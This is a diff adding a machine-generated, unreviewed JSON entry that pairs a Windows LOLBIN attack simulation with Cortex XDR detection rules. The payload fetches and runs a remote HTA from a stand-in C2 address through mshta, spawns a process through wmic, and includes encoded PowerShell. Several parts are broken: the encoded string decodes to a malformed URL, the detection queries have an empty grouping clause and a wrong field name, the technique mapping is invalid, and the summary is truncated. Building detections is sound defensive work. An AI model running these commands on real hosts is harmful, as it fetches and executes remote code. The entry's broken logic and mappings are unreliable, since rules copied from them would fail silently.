@@ -1,0 +1,191 @@
+{
+  "id": "TTP-0000-0125",
+  "schema_version": "1.0.0",
+  "entry_version": "0.1.0",
+  "status": "draft",
+  "metadata": {
+    "created_at": "2026-11-12T00:00:00Z",
+    "updated_at": "2026-11-12T00:00:00Z",
+    "authors": [
+      {
+        "name": "detdev pipeline (local model, unreviewed)",
+        "role": "generator"
+      }
+    ],
+    "tags": [
+      "generated-draft",
+      "platform-windows",
+      "endpoint",
+      "cortex-analytics-alert"
+    ],
+    "pov_engine": {
+      "auto_load": false,
+      "simulation_class": "endpoint",
+      "destructive": false,
+      "platforms": [
+        "windows"
+      ],
+      "cleanup_required": true,
+      "safety_class": "lab-only"
+    }
+  },
+  "identity": {
+    "name": "Multiple Rare LOLBIN Process Executions by User",
+    "summary": "An attacker uses multiple rare LOLBINs (e.g., mshta.exe, wmic.exe) to execute malicious commands, triggering a detection for unusual process execution patterns. Cortex should detect this behavior as a",
+    "description": "An attacker uses multiple rare LOLBINs (e.g., mshta.exe, wmic.exe) to execute malicious commands, triggering a detection for unusual process execution patterns. Cortex should detect this behavior as a potential abuse of trusted Windows binaries."
+  },
+  "mitre_attack": {
+    "matrix": "enterprise",
+    "techniques": [
+      {
+        "technique_id": "T1059",
+        "subtechnique_id": "T1059.001",
+        "name": "Command and Scripting Interpreter: PowerShell",
+        "tactic_ids": [
+          "TA0002"
+        ],
+        "tactic_names": [
+          "Execution"
+        ]
+      },
+      {
+        "technique_id": "T1047",
+        "name": "Windows Management Instrumentation",
+        "tactic_ids": [
+          "TA0002"
+        ],
+        "tactic_names": [
+          "Execution"
+        ]
+      },
+      {
+        "technique_id": "T1086",
+        "name": "T1086",
+        "tactic_ids": [
+          "TA0000"
+        ]
+      }
+    ]
+  },
+  "execution": {
+    "target_platform": "windows",
+    "execution_framework": "custom-cortex",
+    "privilege_required": "administrator",
+    "payload": {
+      "interpreter": "powershell",
+      "code": "powershell -enc JABzACAAPQAgACcAaAB0AHQAcAA6AC8ALwAxADkAMgAwADIAZgAyAC4AMAAvAHMAaQBnAG4AaQBwAHQALgBwAHQAcABzACcA\nmkdir C:\\Windows\\Temp\\test\npowershell -enc JABzACAAPQAgACcAaAB0AHQAcAA6AC8ALwAxADkAMgAwADIAZgAyAC4AMAAvAHMAaQBnAG4AaQBwAHQALgBwAHQAcABzACcA\nmshta.exe http://192.0.2.100/script.hta\nwmic.exe process call create \"cmd /c echo test > C:\\Windows\\Temp\\test\\output.txt\"\n",
+      "input_variables": [],
+      "timeout_seconds": 120
+    },
+    "expected_artifacts": [
+      {
+        "artifact_type": "process",
+        "description": "mshta.exe process execution",
+        "expected_value": "action_process_image_name = 'mshta.exe'"
+      },
+      {
+        "artifact_type": "process",
+        "description": "wmic.exe process execution",
+        "expected_value": "action_process_image_name = 'wmic.exe'"
+      },
+      {
+        "artifact_type": "network-connection",
+        "description": "Connection to C2 IP",
+        "expected_value": "dst_ip = '192.0.2.100'"
+      }
+    ],
+    "cleanup": {
+      "manual_steps": [
+        "Not authored. Write and test cleanup before promotion."
+      ]
+    }
+  },
+  "detections": {
+    "biocs": [
+      {
+        "name": "Multiple Rare LOLBIN Process Executions",
+        "description": "Detection of multiple rare LOLBINs executed by a single user within a short time window",
+        "logic": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_name in ['mshta.exe', 'wmic.exe', 'rundll32.exe']\n| comp count() as cnt by actor_user_name, action_process_image_name\n| comp count() as cnt by\n| filter count > 1",
+        "mitre_technique_ids": [
+          "T1059.001",
+          "T1047",
+          "T1086"
+        ],
+        "severity": "high",
+        "suppression_window_seconds": 0
+      }
+    ],
+    "abiocs": [
+      {
+        "name": "Abnormal LOLBIN Usage Pattern",
+        "description": "Behavioral deviation from normal user process execution using rare LOLBINs",
+        "logic": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_name in ['mshta.exe', 'wmic.exe', 'rundll32.exe']\n| filter actor_user_name != 'SYSTEM'\n| comp count() as cnt by actor_user_name, action_process_image_name\n| comp count() as cnt by\n| filter count > 1",
+        "behavioral_profile": "machine-learning",
+        "causality_anchor": "user process execution",
+        "mitre_technique_ids": [
+          "T1059.001",
+          "T1047",
+          "T1086"
+        ],
+        "severity": "high"
+      }
+    ],
+    "xql_queries": [
+      {
+        "purpose": "validation",
+        "name": "Detect Rare LOLBIN Usage",
+        "query": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_name in ['mshta.exe', 'wmic.exe', 'rundll32.exe']\n| comp count() as cnt by actor_user_name, action_process_image_name\n| comp count() as cnt by\n| filter count > 1",
+        "expected_rows_min": 1,
+        "dataset": "xdr_data"
+      }
+    ],
+    "correlation_rules": [],
+    "iocs": [],
+    "analytics_modules": [
+      "Cortex XSIAM Analytics (XDR Agent) — Multiple Rare LOLBIN Process Executions by User; Required Data: XDR Agent. Ref: https://cortex-docs.paloaltonetworks.com/analytics-alerts/alerts-by-name/multiple-rare-lolbin-process-executions-by-user"
+    ]
+  },
+  "panw_mapping": {
+    "products": [
+      {
+        "module": "cortex-xdr",
+        "submodule": "analytics",
+        "coverage_tier": "detection"
+      }
+    ]
+  },
+  "references": [
+    {
+      "title": "Cortex XDR Analytics Alert Reference: Multiple Rare LOLBIN Process Executions by User",
+      "url": "https://cortex-docs.paloaltonetworks.com/analytics-alerts/alerts-by-name/multiple-rare-lolbin-process-executions-by-user",
+      "publisher": "Palo Alto Networks",
+      "primary": true
+    },
+    {
+      "title": "MITRE ATT&CK T1059.001",
+      "url": "https://attack.mitre.org/techniques/T1059/001/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    },
+    {
+      "title": "MITRE ATT&CK T1047",
+      "url": "https://attack.mitre.org/techniques/T1047/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    },
+    {
+      "title": "MITRE ATT&CK T1086",
+      "url": "https://attack.mitre.org/techniques/T1086/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    }
+  ],
+  "changelog": [
+    {
+      "entry_version": "0.1.0",
+      "date": "2026-11-12",
+      "author": "detdev pipeline (local model, unreviewed)",
+      "change": "Generated draft. Built from the model fragment and its recorded source only; not reviewed, not run."
+    }
+  ]
+}
